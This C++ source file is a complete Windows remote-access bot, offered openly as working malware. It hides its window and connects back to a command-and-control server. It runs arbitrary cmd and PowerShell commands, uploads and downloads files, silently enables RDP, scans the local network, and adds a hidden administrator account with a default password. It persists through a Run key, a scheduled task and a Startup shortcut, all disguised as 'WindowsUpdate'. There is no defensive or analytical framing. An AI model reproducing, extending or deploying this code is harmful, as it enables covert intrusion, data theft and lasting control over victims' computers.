// leverup_bot_fixed.cpp - COMPILABLE VERSION WITH PRIVILEGE ESCALATION & FILE TRANSFER
#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <string>
#include <thread>
#include <atomic>
#include <sstream>
#include <fstream>
#include <iostream>
#include <shlobj.h>
#include <vector>
#include <algorithm>   // for std::max
#include <iphlpapi.h>
#include <icmpapi.h>
#include <thread>
#include <mutex>
#include <vector>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "iphlpapi.lib")

#define BUFFER_SIZE 4096

// Configuration
std::string C2_SERVER_IP = "192.168.1.5";  // Change this
int C2_SERVER_PORT = 8080;

std::atomic<bool> g_running(true);
SOCKET g_socket = INVALID_SOCKET;

// ==================== UTILITY FUNCTIONS ====================

std::string GetLastErrorString() {
    DWORD err = GetLastError();
    if (err == 0) return "No error (unexpected)";

    LPSTR messageBuffer = nullptr;
    size_t size = FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        err,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&messageBuffer,
        0,
        NULL
    );

    std::string message(messageBuffer, size);
    LocalFree(messageBuffer);

    // Remove trailing newlines (common in system messages)
    while (!message.empty() && (message.back() == '\n' || message.back() == '\r')) {
        message.pop_back();
    }
    return message;
}

bool isRunningAsAdmin() {
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
            CloseHandle(hToken);
            return elevation.TokenIsElevated != 0;
        }
        CloseHandle(hToken);
    }
    return false;
}

std::string executeCommand(const std::string& cmd) {
    std::string result = "";
    
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE hRead, hWrite;
    
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) {
        return "[Pipe Error]";
    }
    
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    
    si.cb = sizeof(STARTUPINFOA);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;
    
    std::string commandLine = "cmd.exe /c \"" + cmd + "\"";
    
    if (CreateProcessA(NULL, (LPSTR)commandLine.c_str(), NULL, NULL, TRUE, 
                      CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWrite);
        
        char buffer[4096];
        DWORD bytesRead;
        BOOL success;
        
        while (true) {
            success = ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
            if (!success || bytesRead == 0) break;
            
            buffer[bytesRead] = '\0';
            result += buffer;
        }
        
        WaitForSingleObject(pi.hProcess, 10000);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(hRead);
    } else {
        CloseHandle(hRead);
        CloseHandle(hWrite);
        result = "[Process Error]";
    }
    
    return result;
}

std::string getWindowsVersion() {
    HKEY hKey;
    DWORD dwType = REG_SZ;
    char buffer[256];
    DWORD dwSize = sizeof(buffer);
    
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "ProductName", NULL, &dwType, (LPBYTE)buffer, &dwSize) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return std::string(buffer);
        }
        RegCloseKey(hKey);
    }
    
    OSVERSIONINFOEXA os;
    os.dwOSVersionInfoSize = sizeof(os);
    GetVersionExA((OSVERSIONINFOA*)&os);
    
    if (os.dwMajorVersion == 10) {
        return "Windows 10";
    } else if (os.dwMajorVersion == 6) {
        if (os.dwMinorVersion == 3) return "Windows 8.1";
        if (os.dwMinorVersion == 2) return "Windows Windows 8";
        if (os.dwMinorVersion == 1) return "Windows 7";
        if (os.dwMinorVersion == 0) return "Windows Vista";
    } else if (os.dwMajorVersion == 5) {
        if (os.dwMinorVersion == 2) return "Windows XP 64-bit or Server 2003";
        if (os.dwMinorVersion == 1) return "Windows XP";
    }
    
    return "Windows " + std::to_string(os.dwMajorVersion) + "." + std::to_string(os.dwMinorVersion);
}

std::string getArchitecture() {
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);
    
    switch (sysInfo.wProcessorArchitecture) {
        case PROCESSOR_ARCHITECTURE_AMD64: return "x64";
        case PROCESSOR_ARCHITECTURE_INTEL: return "x86";
        case PROCESSOR_ARCHITECTURE_ARM: return "ARM";
        case PROCESSOR_ARCHITECTURE_ARM64: return "ARM64";
        case PROCESSOR_ARCHITECTURE_IA64: return "IA64";
        default: return "Unknown";
    }
}

std::string getSystemInfo() {
    std::stringstream ss;
    char buffer[256];
    
    DWORD size = sizeof(buffer);
    GetComputerNameA(buffer, &size);
    ss << "Computer: " << buffer << "\n";
    
    GetUserNameA(buffer, &size);
    ss << "User: " << buffer << "\n";
    
    ss << "OS: " << getWindowsVersion() << "\n";
    
    ss << "Arch: " << getArchitecture() << "\n";
    
    ss << "Admin: " << (isRunningAsAdmin() ? "Yes" : "No") << "\n";
    
    char hostname[256];
    gethostname(hostname, sizeof(hostname));
    struct hostent* host = gethostbyname(hostname);
    if (host != NULL) {
        struct in_addr addr;
        memcpy(&addr, host->h_addr_list[0], sizeof(struct in_addr));
        ss << "IP: " << inet_ntoa(addr) << "\n";
    }
    
    return ss.str();
}

// ==================== FILE TRANSFER HELPERS ====================

bool sendFileRaw(const std::string& path) {
    HANDLE hFile = CreateFileA(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL,
                               OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    char buffer[4096];
    DWORD bytesRead;
    while (ReadFile(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0) {
        if (send(g_socket, buffer, bytesRead, 0) == SOCKET_ERROR) {
            CloseHandle(hFile);
            return false;
        }
    }
    CloseHandle(hFile);
    const char* marker = "FILE_END";
    send(g_socket, marker, 8, 0);
    return true;
}

// ==================== UPDATED receiveFileRaw (with default bot folder) ====================
bool receiveFileRaw(const std::string& path) {
    // Show received path
    std::string debug = "Path received: [" + path + "] (length: " + std::to_string(path.length()) + ")\n";
    send(g_socket, debug.c_str(), debug.length(), 0);

    // Trim whitespace
    std::string cleanPath = path;
    cleanPath.erase(0, cleanPath.find_first_not_of(" \t\r\n"));
    cleanPath.erase(cleanPath.find_last_not_of(" \t\r\n") + 1);
    if (cleanPath.empty()) {
        send(g_socket, "ERROR: Destination path is empty\n", 34, 0);
        return false;
    }

    // --- Get the bot's executable directory ---
    char exePath[MAX_PATH];
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    std::string exeDir = exePath;
    size_t lastSlash = exeDir.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        exeDir = exeDir.substr(0, lastSlash);  // keep only directory
    }

    // --- If cleanPath is just a filename (no slashes), prepend the executable directory ---
    std::string fullPath;
    if (cleanPath.find_first_of("\\/") == std::string::npos) {
        fullPath = exeDir + "\\" + cleanPath;
        debug = "No directory specified, saving in bot folder: [" + fullPath + "]\n";
        send(g_socket, debug.c_str(), debug.length(), 0);
    } else {
        fullPath = cleanPath;
    }

    // --- Create destination directory if it doesn't exist ---
    lastSlash = fullPath.find_last_of("\\/");
    if (lastSlash != std::string::npos) {
        std::string dir = fullPath.substr(0, lastSlash);
        if (!dir.empty()) {
            // Create directory recursively
            size_t pos = 0;
            while ((pos = dir.find_first_of("\\/", pos + 1)) != std::string::npos) {
                std::string sub = dir.substr(0, pos);
                CreateDirectoryA(sub.c_str(), NULL); // ignore errors
            }
            CreateDirectoryA(dir.c_str(), NULL);
        }
    }

    // Delete any existing file (to avoid sharing violation)
    DeleteFileA(fullPath.c_str());

    // Retry loop for file creation with sharing
    HANDLE hFile = INVALID_HANDLE_VALUE;
    const int MAX_RETRIES = 5;
    for (int attempt = 1; attempt <= MAX_RETRIES; ++attempt) {
        hFile = CreateFileA(
            fullPath.c_str(),
            GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            NULL,
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (hFile != INVALID_HANDLE_VALUE) break;

        DWORD err = GetLastError();
        if (err == ERROR_SHARING_VIOLATION && attempt < MAX_RETRIES) {
            char retryMsg[128];
            sprintf(retryMsg, "File locked, retrying (%d/%d)...\n", attempt, MAX_RETRIES);
            send(g_socket, retryMsg, strlen(retryMsg), 0);
            Sleep(1000);
        } else {
            std::string errMsg = "CreateFile failed: " + GetLastErrorString() + "\n";
            send(g_socket, errMsg.c_str(), errMsg.length(), 0);
            return false;
        }
    }
    if (hFile == INVALID_HANDLE_VALUE) {
        send(g_socket, "ERROR: Could not open file after retries\n", 41, 0);
        return false;
    }

    char buffer[4096];
    std::string dataBuffer;
    bool success = false;
    DWORD totalReceived = 0;
    time_t startTime = time(nullptr);
    const int TIMEOUT_SEC = 30;

    while (time(nullptr) - startTime < TIMEOUT_SEC) {
        fd_set readSet;
        FD_ZERO(&readSet);
        FD_SET(g_socket, &readSet);
        timeval tv = {1, 0};
        int selectResult = select(0, &readSet, nullptr, nullptr, &tv);
        if (selectResult == SOCKET_ERROR) {
            send(g_socket, "select() failed\n", 17, 0);
            break;
        }
        if (selectResult == 0) continue;

        int bytes = recv(g_socket, buffer, sizeof(buffer), 0);
        if (bytes <= 0) {
            if (bytes == 0) send(g_socket, "Connection closed by server\n", 29, 0);
            else send(g_socket, "recv error\n", 12, 0);
            break;
        }

        totalReceived += bytes;
        char progress[128];
        sprintf(progress, "Received %lu bytes (first few: %.4s)...\n", totalReceived, buffer);
        send(g_socket, progress, strlen(progress), 0);

        // --- If the first chunk starts with "[-]", it's an error message ---
        if (totalReceived == bytes && bytes >= 3 && memcmp(buffer, "[-]", 3) == 0) {
            send(g_socket, "ERROR: Server sent an error message, aborting file transfer\n", 60, 0);
            break;
        }

        dataBuffer.append(buffer, bytes);
        size_t pos = dataBuffer.find("FILE_END");
        if (pos != std::string::npos) {
            if (pos > 0) {
                DWORD written;
                if (!WriteFile(hFile, dataBuffer.c_str(), pos, &written, NULL)) {
                    std::string writeErr = "WriteFile failed: " + GetLastErrorString() + "\n";
                    send(g_socket, writeErr.c_str(), writeErr.length(), 0);
                    break;
                }
            }
            success = true;
            char done[64];
            sprintf(done, "File transfer complete (%lu bytes)\n", totalReceived - (dataBuffer.size() - pos));
            send(g_socket, done, strlen(done), 0);
            break;
        }
    }

    CloseHandle(hFile);
    if (!success) {
        const char* err = "ERROR: File transfer incomplete (timeout or missing marker)\n";
        send(g_socket, err, strlen(err), 0);
        DeleteFileA(fullPath.c_str());
        return false;
    }
    return true;
}
// ==================== END OF UPDATED FUNCTION ====================

// ==================== COMMAND HANDLERS ====================

std::string handleSysinfo() {
    return "[SYSTEM_INFO]\n" + getSystemInfo() + "[END]\n";
}

std::string handleEnableRDP() {
    std::string result = "[RDP]\n";
    executeCommand("reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f");
    executeCommand("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes");
    result += "RDP Enabled (silently)\n";
    result += "Connect with: mstsc /v:<IP_ADDRESS>\n";
    result += "[END]\n";
    return result;
}

std::string handleLaunch(const std::string& appName) {
    std::string result = "[LAUNCH]\n";
    result += "Attempting to launch: " + appName + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    
    INT_PTR shellResult = (INT_PTR)ShellExecuteA(NULL, "open", appName.c_str(), NULL, NULL, SW_HIDE);
    
    if (shellResult > 32) {
        result += "Successfully launched (hidden)\n";
        result += "Return code: " + std::to_string(shellResult) + "\n";
    } else {
        result += "Failed to launch\n";
    }
    
    result += "[END]\n";
    return result;
}

std::string handleDir() {
    std::string cmd = "dir";
    std::string result = "[COMMAND] Executing: " + cmd + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += executeCommand(cmd);
    return result;
}

std::string handleKill(const std::string& pid) {
    std::string cmd = "taskkill /PID " + pid + " /F";
    std::string result = "[COMMAND] Executing: " + cmd + "\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += executeCommand(cmd);
    return result;
}

std::string handleShell() {
    std::string result = "[SHELL]\n";
    result += "Starting shell...\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += "Shell ready for commands\n";
    result += "[END]\n";
    return result;
}


// ================ Network Scan ========================================
std::string handleNetworkScan() {
    std::string result = "[NETWORK_SCAN]\n";

    // ===== 1. Get local IP and subnet mask using GetAdaptersInfo =====
    DWORD dwSize = 0;
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL) {
        result += "Error: Memory allocation failed\n[END]\n";
        return result;
    }
    dwSize = sizeof(IP_ADAPTER_INFO);
    DWORD ret = GetAdaptersInfo(pAdapterInfo, &dwSize);
    if (ret == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(dwSize);
        if (pAdapterInfo == NULL) {
            result += "Error: Memory allocation failed\n[END]\n";
            return result;
        }
        ret = GetAdaptersInfo(pAdapterInfo, &dwSize);
    }
    if (ret != NO_ERROR) {
        result += "Error getting adapter info: " + std::to_string(ret) + "\n[END]\n";
        free(pAdapterInfo);
        return result;
    }

    std::string localIP, subnetMask;
    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
    while (pAdapter) {
        // Skip loopback and disconnected adapters
        if (pAdapter->Type != MIB_IF_TYPE_LOOPBACK &&
            pAdapter->IpAddressList.IpAddress.String[0] != '0') {
            localIP = pAdapter->IpAddressList.IpAddress.String;
            subnetMask = pAdapter->IpAddressList.IpMask.String;
            break;
        }
        pAdapter = pAdapter->Next;
    }
    free(pAdapterInfo);

    if (localIP.empty() || subnetMask.empty()) {
        result += "Could not determine local network.\n[END]\n";
        return result;
    }

    // ===== 2. Calculate network range using Windows inet_addr =====
    // inet_addr returns an unsigned long in network byte order
    unsigned long ipAddr = inet_addr(localIP.c_str());
    unsigned long maskAddr = inet_addr(subnetMask.c_str());
    if (ipAddr == INADDR_NONE || maskAddr == INADDR_NONE) {
        result += "Invalid IP or mask.\n[END]\n";
        return result;
    }

    unsigned long networkAddr = ipAddr & maskAddr;
    unsigned long broadcastAddr = networkAddr | ~maskAddr;

    // Convert to host byte order for easier manipulation
    unsigned long start = ntohl(networkAddr);
    unsigned long end = ntohl(broadcastAddr);
    unsigned long firstIP = start + 1;
    unsigned long lastIP = end - 1;

    // Helper lambda to convert a host-order IP to dotted string
    auto ipToString = [](unsigned long hostIP) -> std::string {
        struct in_addr addr;
        addr.s_addr = htonl(hostIP);
        return inet_ntoa(addr);
    };

    result += "Scanning network: " + localIP + "/" + subnetMask + "\n";
    result += "Range: " + ipToString(start) + " - " + ipToString(end) + "\n";

    // ===== 3. Parallel ARP scan =====
    const int THREAD_COUNT = 10;
    std::vector<std::string> liveHosts;
    std::vector<std::thread> threads;
    std::mutex resultMutex;

    auto scanWorker = [&](unsigned long startIP, unsigned long endIP) {
        for (unsigned long ip = startIP; ip <= endIP; ++ip) {
            struct in_addr addr;
            addr.s_addr = htonl(ip);

            ULONG mac[2] = { 0 };
            ULONG macLen = 6;
            DWORD arpRet = SendARP(addr.s_addr, 0, mac, &macLen);
            if (arpRet == NO_ERROR) {
                // Convert IP to string safely (inet_ntoa uses a static buffer, so copy immediately)
                char* ipStr = inet_ntoa(addr);
                if (ipStr) {
                    std::lock_guard<std::mutex> lock(resultMutex);
                    liveHosts.push_back(std::string(ipStr));
                }
            }
        }
    };

    // Split the IP range among threads
    unsigned long totalIPs = lastIP - firstIP + 1;
    unsigned long ipsPerThread = totalIPs / THREAD_COUNT;
    unsigned long remainder = totalIPs % THREAD_COUNT;

    unsigned long currentStart = firstIP;
    for (int i = 0; i < THREAD_COUNT; ++i) {
        unsigned long currentEnd = currentStart + ipsPerThread - 1;
        if (i < remainder) currentEnd++;
        if (currentEnd > lastIP) currentEnd = lastIP;
        if (currentStart <= currentEnd) {
            threads.emplace_back(scanWorker, currentStart, currentEnd);
        }
        currentStart = currentEnd + 1;
    }

    for (auto& t : threads) {
        t.join();
    }

    // ===== 4. Build results =====
    result += "\n=== Live Hosts (ARP) ===\n";
    for (const auto& ip : liveHosts) {
        result += ip + "\n";
    }

    // ===== 5. (Optional) Get system ARP cache =====
    result += "\n=== System ARP Cache ===\n";
    DWORD dwSize2 = 0;
    PMIB_IPNETTABLE pIpNetTable = NULL;
    GetIpNetTable(pIpNetTable, &dwSize2, FALSE);
    if (dwSize2 > 0) {
        pIpNetTable = (PMIB_IPNETTABLE)malloc(dwSize2);
        if (pIpNetTable) {
            if (GetIpNetTable(pIpNetTable, &dwSize2, FALSE) == NO_ERROR) {
                for (DWORD i = 0; i < pIpNetTable->dwNumEntries; i++) {
                    unsigned long arpIP = ntohl(pIpNetTable->table[i].dwAddr);
                    if (arpIP >= start && arpIP <= end) {
                        struct in_addr addr;
                        addr.s_addr = htonl(arpIP);
                        char* ipStr = inet_ntoa(addr);
                        if (ipStr) {
                            result += ipStr;
                            if (pIpNetTable->table[i].dwType == 3)
                                result += " (dynamic)\n";
                            else if (pIpNetTable->table[i].dwType == 4)
                                result += " (static)\n";
                            else
                                result += "\n";
                        }
                    }
                }
            }
            free(pIpNetTable);
        }
    }

    // ===== 6. Summary =====
    result += "\n=== Summary ===\n";
    result += "Total hosts found via ARP scan: " + std::to_string(liveHosts.size()) + "\n";
    result += "Scan completed.\n";
    result += "[END]\n";
    return result;
}

std::string handlePrivEsc(const std::string& username = "", const std::string& password = "") {
    std::string result = "[PRIVESC]\n";
    result += "Attempting privilege escalation - Add user to Administrators group\n";
    result += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    
    if (!isRunningAsAdmin()) {
        result += "ERROR: Not running as Administrator. Cannot add user.\n";
        result += "[END]\n";
        return result;
    }
    
    std::string newUser = username.empty() ? "SystemHelper" : username;
    std::string newPass = password.empty() ? "P@ssw0rd123!" : password;
    
    result += "Username: " + newUser + "\n";
    result += "Password: " + newPass + "\n";
    
    result += "\n=== Method 1: Net Commands ===\n";
    
    std::string addUserCmd = "net user " + newUser + " " + newPass + " /add";
    result += "Command: " + addUserCmd + "\n";
    result += executeCommand(addUserCmd);
    
    std::string addToAdminCmd = "net localgroup administrators " + newUser + " /add";
    result += "Command: " + addToAdminCmd + "\n";
    result += executeCommand(addToAdminCmd);
    
    result += "\n=== Method 2: PowerShell ===\n";
    std::string psCmd = "powershell -WindowStyle Hidden -Command \"& {";
    psCmd += "try {";
    psCmd += "    $pass = ConvertTo-SecureString '" + newPass + "' -AsPlainText -Force; ";
    psCmd += "    New-LocalUser -Name '" + newUser + "' -Password $pass -ErrorAction Stop; ";
    psCmd += "    Add-LocalGroupMember -Group 'Administrators' -Member '" + newUser + "' -ErrorAction Stop; ";
    psCmd += "    Write-Output '[SUCCESS] User created and added to Administrators group'; ";
    psCmd += "} catch { Write-Output ('[ERROR] ' + $_.Exception.Message) }";
    psCmd += "}\"";
    
    result += "Command: powershell ...\n";
    result += executeCommand(psCmd);
    
    result += "\n=== Verification ===\n";
    std::string verifyUserCmd = "net user " + newUser;
    result += "Command: " + verifyUserCmd + "\n";
    result += executeCommand(verifyUserCmd);
    
    std::string verifyGroupCmd = "net localgroup administrators";
    result += "\nCommand: " + verifyGroupCmd + "\n";
    std::string groupOutput = executeCommand(verifyGroupCmd);
    result += "Output: " + groupOutput;
    
    if (groupOutput.find(newUser) != std::string::npos) {
        result += "\n[SUCCESS] User '" + newUser + "' successfully added to Administrators group!\n";
        result += "You can now login with these credentials.\n";
    } else {
        result += "\n[WARNING] User may not have been added to Administrators group.\n";
    }
    
    result += "[END]\n";
    return result;
}

std::string handlePowerShell(const std::string& command) {
    std::string result = "[POWERSHELL]\n";
    result += "Running PowerShell command as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
    result += "Command: " + command + "\n";
    result += "Output:\n";
    
    std::string fullCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"" + command + "\"";
    
    result += executeCommand(fullCommand);
    result += "[END]\n";
    return result;
}

std::string getCurrentExecutablePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

std::string handlePersistence() {
    std::string result = "[PERSISTENCE]\n";
    
    std::string currentPath = getCurrentExecutablePath();
    
    std::string regCmd = "reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"WindowsUpdate\" /t REG_SZ /d \"";
    regCmd += currentPath + "\" /f";
    executeCommand(regCmd);
    
    result += "Added to HKCU Run\n";
    
    std::string taskCmd = "schtasks /create /tn \"WindowsUpdateService\" /tr \"";
    taskCmd += currentPath + "\" /sc onlogon /ru \"System\" /f";
    executeCommand(taskCmd);
    
    result += "Created scheduled task\n";
    
    char username[256];
    DWORD username_len = 256;
    GetUserNameA(username, &username_len);
    
    std::string startupPath = "C:\\Users\\" + std::string(username) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk";
    
    std::string psShortcut = "powershell -WindowStyle Hidden -Command \"";
    psShortcut += "$WshShell = New-Object -comObject WScript.Shell; ";
    psShortcut += "$Shortcut = $WshShell.CreateShortcut('" + startupPath + "'); ";
    psShortcut += "$Shortcut.TargetPath = '" + currentPath + "'; ";
    psShortcut += "$Shortcut.Save()\"";
    
    executeCommand(psShortcut);
    
    result += "Added to Startup folder\n";
    result += "[END]\n";
    
    return result;
}

// ==================== NETWORK FUNCTIONS ====================

bool connectToServer() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return false;
    }
    
    g_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (g_socket == INVALID_SOCKET) {
        WSACleanup();
        return false;
    }
    
    sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(C2_SERVER_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(C2_SERVER_IP.c_str());
    
    if (connect(g_socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
        closesocket(g_socket);
        WSACleanup();
        return false;
    }
    
    return true;
}

void sendResponse(const std::string& data) {
    if (g_socket != INVALID_SOCKET) {
        send(g_socket, data.c_str(), data.length(), 0);
    }
}

void flushSocketBuffer() {
    // Switch to non-blocking mode and read all pending data
    u_long mode = 1;
    ioctlsocket(g_socket, FIONBIO, &mode);
    char dummy[1024];
    while (recv(g_socket, dummy, sizeof(dummy), 0) > 0) {}
    mode = 0;
    ioctlsocket(g_socket, FIONBIO, &mode);
}

void handleCommand(const std::string& command) {
    std::string response;
    
    if (command == "sysinfo") {
        response = handleSysinfo();
    }
    else if (command == "enablerdp") {
        response = handleEnableRDP();
    }
    else if (command == "networkscan") {
        response = handleNetworkScan();
    }
    else if (command == "dir") {
        response = handleDir();
    }
    else if (command.find("kill ") == 0) {
        std::string pid = command.substr(5);
        response = handleKill(pid);
    }
    else if (command == "shell") {
        response = handleShell();
    }
    else if (command == "persist") {
        response = handlePersistence();
    }
    else if (command.find("powershell ") == 0) {
        std::string psCommand = command.substr(10);
        response = handlePowerShell(psCommand);
    }
    else if (command.find("store ") == 0) {
        std::string path = command.substr(6);
        bool success = sendFileRaw(path);
        response = success ? "[UPLOAD] File sent successfully\n" : "[UPLOAD_ERROR] Failed to send file\n";
    }
    else if (command.find("retrieve ") == 0) {
        std::string dest = command.substr(9);
        bool success = receiveFileRaw(dest);
        response = success ? "[DOWNLOAD] File received successfully\n" : "[DOWNLOAD_ERROR] Failed to receive file\n";
    }
    else if (command.find("launch ") == 0) {
        std::string appName = command.substr(7);
        response = handleLaunch(appName);
    }
    else if (command == "privesc") {
        response = handlePrivEsc();
    }
    else if (command.find("privesc ") == 0) {
        std::string params = command.substr(8);
        size_t spacePos = params.find(' ');
        if (spacePos != std::string::npos) {
            std::string username = params.substr(0, spacePos);
            std::string password = params.substr(spacePos + 1);
            response = handlePrivEsc(username, password);
        } else {
            response = handlePrivEsc(params, "");
        }
    }
    else if (command == "help") {
        response = "[HELP] Available commands: sysinfo, enablerdp, dir, kill <pid>, launch <app/file>, privesc [username] [password], shell, persist, networkscan, store <path>, retrieve <path>, help, exit\n";
    }
    else if (command == "exit") {
        response = "[+] Goodbye\n";
        g_running = false;
    }
    else {
        std::string cmd = command;
        response = "[COMMAND] Executing: " + cmd + "\n";
        response += "[ADMIN] Running as: " + std::string(isRunningAsAdmin() ? "Administrator" : "Standard User") + "\n";
        response += executeCommand(cmd);
        if (response.find_last_of('\n') != response.length() - 1) {
            response += "\n";
        }
    }
    
    sendResponse(response);
    
    // After handling any command, flush any leftover data to keep the socket clean
    flushSocketBuffer();
}

// ==================== MAIN LOOP ====================

void botLoop() {
    std::string sysinfo = handleSysinfo();
    sendResponse(sysinfo);
    
    char buffer[BUFFER_SIZE];
    
    while (g_running) {
        int bytes = recv(g_socket, buffer, BUFFER_SIZE - 1, 0);
        
        if (bytes > 0) {
            buffer[bytes] = '\0';
            std::string command(buffer);
            
            if (!command.empty() && command.back() == '\n') {
                command.pop_back();
            }
            if (!command.empty() && command.back() == '\r') {
                command.pop_back();
            }
            
            handleCommand(command);
        }
        else if (bytes == 0) {
            break;
        }
        
        Sleep(100);
    }
}

// ==================== ENTRY POINT ====================

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    
    if (argc >= 3) {
        char ipBuffer[256];
        wcstombs(ipBuffer, argv[1], 256);
        C2_SERVER_IP = ipBuffer;
        
        char portBuffer[256];
        wcstombs(portBuffer, argv[2], 256);
        C2_SERVER_PORT = atoi(portBuffer);
    }
    
    LocalFree(argv);
    
    HWND consoleWindow = GetConsoleWindow();
    ShowWindow(consoleWindow, SW_HIDE);
    
    while (g_running) {
        if (connectToServer()) {
            botLoop();
            
            if (g_running) {
                Sleep(10000);
            }
        } else {
            Sleep(10000);
        }
    }
    
    closesocket(g_socket);
    WSACleanup();
    return 0;
}